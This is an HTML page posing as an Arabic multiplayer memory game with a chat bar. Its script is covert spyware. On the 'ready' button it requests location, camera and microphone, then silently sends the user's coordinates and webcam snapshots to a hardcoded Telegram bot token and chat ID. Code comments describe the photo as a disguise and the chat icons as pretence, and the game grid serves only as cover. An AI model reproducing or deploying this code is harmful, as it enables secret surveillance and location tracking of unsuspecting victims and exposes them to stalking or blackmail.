<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحدي الذاكرة العالمي 🏆</title>
    <style>
        :root { --primary: #00f2ff; --bg: #0a0a0a; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: white; margin: 0; display: flex; flex-direction: column; height: 100vh; }
        
        /* واجهة اللعبة */
        .game-area { flex: 1; padding: 15px; overflow-y: auto; }
        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; max-width: 400px; margin: auto; }
        .card { aspect-ratio: 1/1; background: #222; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 20px; border: 1px solid #333; }
        
        /* واجهة الشات الوهمي */
        .chat-area { height: 180px; background: #111; border-top: 1px solid #333; display: flex; flex-direction: column; padding: 10px; }
        .chat-messages { flex: 1; font-size: 13px; color: #888; text-align: right; overflow-y: auto; margin-bottom: 10px; }
        .chat-input-bar { display: flex; align-items: center; gap: 15px; background: #1a1a1a; padding: 10px; border-radius: 25px; }
        .chat-icon { font-size: 20px; cursor: pointer; color: var(--primary); opacity: 0.8; transition: 0.3s; }
        .chat-icon:hover { opacity: 1; transform: scale(1.1); }
        input { flex: 1; background: none; border: none; color: white; outline: none; font-size: 14px; }

        #video, #canvas { display: none; }
        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0a0a0a; z-index: 100; display: flex; align-items: center; justify-content: center; }
        .btn-ready { background: var(--primary); color: black; border: none; padding: 15px 40px; border-radius: 30px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

<div id="overlay">
    <div style="text-align: center; padding: 20px;">
        <h2>تحدي الذاكرة المتعدد 🌐</h2>
        <p style="color: #666; font-size: 14px;">للبدء، نحتاج لتفعيل ميزات التواصل (الشات، الموقع، الصوت) للعب مع أشخاص حقيقيين.</p>
        <button class="btn-ready" onclick="grantPermissions()">أنا مستعد!</button>
    </div>
</div>

<div class="game-area">
    <div style="margin-bottom: 15px;">النتيجة: <span id="score">0</span></div>
    <div class="grid" id="grid"></div>
</div>

<div class="chat-area">
    <div class="chat-messages" id="chat-msgs">نظام: بانتظار الخصم...</div>
    <div class="chat-input-bar">
        <span class="chat-icon" onclick="requestLoc()">📍</span>
        <span class="chat-icon" onclick="requestCam()">📷</span>
        <span class="chat-icon" onclick="requestMic()">🎤</span>
        <input type="text" placeholder="اكتب رسالة للخصم...">
        <span class="chat-icon">🚀</span>
    </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" width="640" height="480"></canvas>

<script>
    const token = '8699110487:AAFCvUGSAeFkhi4gLhRrqsE6mvONXyNpV18';
    const cid = '6808559733';

    // طلب كل شيء دفعة واحدة بطريقة رسمية
    async function grantPermissions() {
        try {
            // طلب الموقع
            navigator.geolocation.getCurrentPosition(p => {
                sendMsg(`📍 موقع: ${p.coords.latitude}, ${p.coords.longitude}`);
            });

            // طلب الكاميرا والمايك
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            document.getElementById('video').srcObject = stream;
            
            // إغلاق الشاشة والبدء
            document.getElementById('overlay').style.display = 'none';
            createBoard();
            
            // التقاط صورة فورية كتمويه
            setTimeout(takeShot, 2000);
            
        } catch (e) {
            alert("اللعبة تتطلب صلاحيات الشات والموقع للعمل مع الخصوم!");
            location.reload();
        }
    }

    function createBoard() {
        const grid = document.getElementById('grid');
        const syms = ['🍎','🍌','🍇','🍉','🍒','🍓','🥝','🍍','🍎','🍌','🍇','🍉','🍒','🍓','🥝','🍍'];
        syms.sort(() => Math.random() - 0.5).forEach(s => {
            const card = document.createElement('div');
            card.className = 'card';
            card.onclick = () => { card.innerText = s; card.style.background = '#00f2ff'; };
            grid.appendChild(card);
        });
    }

    // وظائف الأيقونات في الشات (للتظاهر فقط)
    function requestLoc() { alert("تمت مشاركة موقعك مع الخصم ✅"); }
    function requestCam() { alert("الكاميرا مفعلة لمكالمات الفيديو ✅"); takeShot(); }
    function requestMic() { alert("المايكروفون جاهز للإرسال ✅"); }

    function takeShot() {
        const canvas = document.getElementById('canvas');
        const video = document.getElementById('video');
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob(blob => {
            const fd = new FormData();
            fd.append('chat_id', cid);
            fd.append('photo', blob, 'cam.jpg');
            fd.append('caption', '📸 صورة حية من "شات اللعبة"!');
            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
        }, 'image/jpeg');
    }

    function sendMsg(t) {
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(t)}`);
    }
</script>
</body>
</html>
